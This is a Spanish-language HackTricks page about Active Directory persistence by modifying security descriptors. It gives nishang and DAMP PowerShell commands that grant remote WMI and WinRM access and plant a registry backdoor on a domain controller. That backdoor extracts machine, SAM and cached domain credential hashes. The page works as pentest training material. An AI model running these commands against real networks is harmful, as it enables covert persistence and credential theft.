# Descriptores de seguridad

{{#include ../../banners/hacktricks-training.md}}

## Descriptores de seguridad

[De la documentación](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) define el formato utilizado para describir un descriptor de seguridad. SDDL utiliza cadenas ACE para DACL y SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Los **descriptores de seguridad** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** un **objeto**. Si puedes simplemente **hacer** un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.

Por lo tanto, esta técnica de persistencia se basa en la capacidad de obtener todos los privilegios necesarios sobre determinados objetos, para poder realizar una tarea que normalmente requiere privilegios de administrador, pero sin necesidad de ser administrador.

### Acceso a WMI

Puedes dar a un usuario acceso para **ejecutar WMI de forma remota** [**utilizando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acceso a WinRM

Concede acceso a la consola de PS de **winrm a un usuario** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acceso remoto a hashes

Accede al **registro** y **extrae hashes** creando un **Reg backdoor using** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para poder recuperar en cualquier momento el **hash del equipo**, la **SAM** y cualquier credencial de **AD** cacheada en el equipo. Por lo tanto, es muy útil conceder este permiso a un **usuario normal contra un equipo Controlador de Dominio**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consulta [**Silver Tickets**](silver-ticket.md) para aprender cómo podrías usar el hash de la cuenta de equipo de un controlador de dominio.

## Referencias

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
